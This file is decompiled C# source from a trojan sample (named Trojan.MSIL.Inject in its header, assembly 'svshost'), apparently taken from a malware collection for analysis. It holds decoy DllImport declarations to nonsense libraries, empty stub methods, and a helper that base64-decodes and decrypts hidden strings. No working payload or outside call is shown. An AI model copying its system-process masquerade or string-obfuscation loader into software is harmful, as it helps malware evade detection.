// Decompiled with JetBrains decompiler
// Type: aheehzhdzdhzez
// Assembly: svshost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C06A01B4-C5C5-4996-A5A4-97A6A6B68B93
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.MSIL.Inject.qn-c112900cf5623f6aa5b0f1ce346cffb90ec3e7bef9632e9e204a946ca3672c86.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Runtime.InteropServices;
using System.Text;

[StandardModule]
internal sealed class aheehzhdzdhzez
{
  [DllImport("Cry.dll", EntryPoint = "usep32", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern char caaPProceL(short window, long name, ArrayList msg, byte[] cbuff);

  [DllImport("Bc.dll", EntryPoint = "Wondows", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern string BcicCry(int msg, ArrayList name, int hkey, byte[] xPa);

  [DllImport("LoLer.dll", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern string CryaPzc(
    long hkey,
    int name,
    char crap,
    int license,
    byte[] path,
    StringBuilder number,
    string[] Zfinder);

  [DllImport("wc.dll", EntryPoint = "mu", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int aPcaVc(
    ArrayList crap,
    char name,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string count,
    long user,
    string[] moIdea);

  [DllImport("mu.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern short LoLerWondowsRegmak(
    int count,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string name,
    StringBuilder proces,
    ArrayList window,
    byte[] xPa,
    char crap);

  [DllImport("Vc.dll", CharSet = CharSet.Unicode, SetLastError = true)]
  public static extern int ProceLLoLerKa(char proces, string[] Id);

  [DllImport("Bc.dll", CharSet = CharSet.Unicode, SetLastError = true)]
  public static extern byte[] aPcaWi([MarshalAs(UnmanagedType.VBByRefStr)] ref string Id, string[] name, char hkey);

  [DllImport("Wondows.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int wccaKa(
    StringBuilder Zfinder,
    byte name,
    short number,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string crap,
    byte[] xPa,
    long window,
    ArrayList user);

  [DllImport("Vc.dll", CharSet = CharSet.Unicode, SetLastError = true)]
  public static extern string ProceLicWi(
    string[] number,
    short name,
    int moIdea,
    StringBuilder count,
    byte[] path,
    ArrayList msg,
    byte Zfinder,
    int window,
    char license);

  [DllImport("oc.dll", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern char CrycaRegmak(
    byte moIdea,
    int name,
    long Tempe,
    string[] proces,
    byte[] cbuff,
    short number);

  [DllImport("Cry.dll", EntryPoint = "ca", CharSet = CharSet.Unicode, SetLastError = true)]
  public static extern int VcRegmakwc(
    short Tempe,
    long name,
    ArrayList license,
    byte Id,
    byte[] xPa,
    char crap,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string hkey);

  [DllImport("ic.dll", EntryPoint = "Regmak", CharSet = CharSet.Unicode, SetLastError = true)]
  public static extern StringBuilder Wizcca(
    int license,
    ArrayList name,
    int user,
    short Zfinder,
    byte[] path,
    long Tempe);

  [DllImport("ca.dll", CharSet = CharSet.Unicode, SetLastError = true)]
  public static extern string aPwcVc(
    long user,
    int name,
    char window,
    int number,
    byte[] cbuff,
    StringBuilder proces,
    string[] count);

  [DllImport("Cry.dll", CharSet = CharSet.Unicode, SetLastError = true)]
  public static extern byte caWondowsKa(
    ArrayList window,
    char name,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string msg,
    long moIdea,
    byte[] xPa,
    int user);

  [DllImport("aP.dll", EntryPoint = "mu", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern string[] aPaPzc(
    int msg,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string name,
    StringBuilder hkey,
    ArrayList Tempe,
    byte[] path,
    byte Zfinder,
    short Id);

  [DllImport("ic.dll", EntryPoint = "ic", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern long ProceLVcVc(
    char hkey,
    StringBuilder name,
    string[] crap,
    int license,
    byte[] cbuff,
    short number,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string msg,
    byte hwnd);

  [DllImport("oc.dll", EntryPoint = "mu", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern char WondowsProceLusep32([MarshalAs(UnmanagedType.VBByRefStr)] ref string crap, byte count);

  [DllImport("Regmak.dll", EntryPoint = "me", CharSet = CharSet.Unicode, SetLastError = true)]
  public static extern byte[] aPWondowsRegmak(StringBuilder count, byte name, [MarshalAs(UnmanagedType.VBByRefStr)] ref string window);

  [DllImport("Cry.dll", EntryPoint = "aP", CharSet = CharSet.Unicode, SetLastError = true)]
  public static extern StringBuilder icKaca(string[] proces, int Id);

  [DllImport("wc.dll", CharSet = CharSet.Unicode, SetLastError = true)]
  public static extern ArrayList memuBc(
    byte Id,
    int name,
    long Zfinder,
    string[] hkey,
    byte[] xPa,
    int user,
    char license);

  [DllImport("LoLer.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern char aPBcaP(short Zfinder, long name, ArrayList number, byte[] path);

  [DllImport("Bc.dll", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern string[] meVcLoLer(
    int number,
    ArrayList name,
    int moIdea,
    short count,
    byte[] cbuff,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string msg,
    long Zfinder,
    char hwnd);

  [DllImport("ic.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern short icWiKa(
    long moIdea,
    int name,
    char Tempe,
    int proces,
    byte[] xPa,
    StringBuilder hkey,
    ArrayList number,
    string[] msg,
    byte user);

  [DllImport("Regmak.dll", EntryPoint = "Bc", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern byte[] CrymeRegmak(ArrayList Tempe, char name, long Id);

  [DllImport("Vc.dll", CharSet = CharSet.Unicode, SetLastError = true)]
  public static extern short ococme(
    int license,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string name,
    StringBuilder user,
    ArrayList Zfinder,
    byte[] cbuff,
    char Tempe);

  [DllImport("Wi.dll", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern int WiWondowsProceL(char user, string[] window);

  [DllImport("Vc.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern long VcCryusep32(
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string window,
    string[] name,
    byte msg,
    char moIdea,
    byte[] path,
    StringBuilder user);

  [DllImport("aP.dll", EntryPoint = "Bc", CharSet = CharSet.Unicode, SetLastError = true)]
  public static extern string[] KamuCry(
    StringBuilder msg,
    byte name,
    short hkey,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string Tempe,
    long Zfinder);

  [DllImport("ProceL.dll", EntryPoint = "ProceL", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern byte[] Bcmuca(string[] hkey, short name, StringBuilder license);

  [DllImport("Vc.dll", CharSet = CharSet.Unicode, SetLastError = true)]
  public static extern StringBuilder memuwc(
    byte crap,
    int name,
    long count,
    string[] user,
    byte[] path,
    int moIdea,
    short hkey,
    char number,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string Id);

  [DllImport("Wi.dll", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern string[] CryProceLwc(
    short count,
    long name,
    ArrayList proces,
    byte window,
    byte[] cbuff,
    char Tempe,
    int crap,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string moIdea,
    StringBuilder Zfinder);

  public static byte[] BuEubofOvOzppmpu(
    int rvZTPvbQcOeDfgId,
    string TdicbTzgdRGNcLTF,
    byte[] oTUfVBnGRLvfEnFu)
  {
    byte[] numArray;
    return numArray;
  }

  public static byte[] ddFpvLEZcHSSmBpQ(
    int TeaOmSAbGHAgbuLz,
    string MgsmbdtcmHgsQpee,
    byte[] DhOIPmpeQHNGGlzM)
  {
    byte[] numArray;
    return numArray;
  }

  public static byte[] eUpDMIhIvLerthac(
    int UVIbBRdMcILFlcsI,
    string NZdApcZOGIrSaVOp,
    byte[] EavVelSQmIZfPQhV)
  {
    byte[] numArray;
    return numArray;
  }

  public static byte[] tihgEtlguHtTvfRr(
    int llCEsDficHbgnama,
    string cmUdhMbmGGHtcTFF,
    byte[] SnpBVTTomGoHRObn)
  {
    byte[] numArray;
    return numArray;
  }

  public static byte[] ubRtSsOSQIFsFMCD(
    int mcmRHCIUvImGuGUl,
    string ddFpvLEZcHSSmBpQ,
    byte[] TeaOmSAbGHAgbuLz)
  {
    byte[] numArray;
    return numArray;
  }

  [STAThread]
  public static void Main() => justsomeshit.doit();

  public static string dwdda(string ÔÖÓ) => Environment.GetEnvironmentVariable(ÔÖÓ);

  public static string fkaOWJfawjfozkLZD(string ÂÄÀ) => Encoding.Unicode.GetString(jdawdiawhiwhfifaw.ÉËÊ(Convert.FromBase64String(ÂÄÀ)));
}
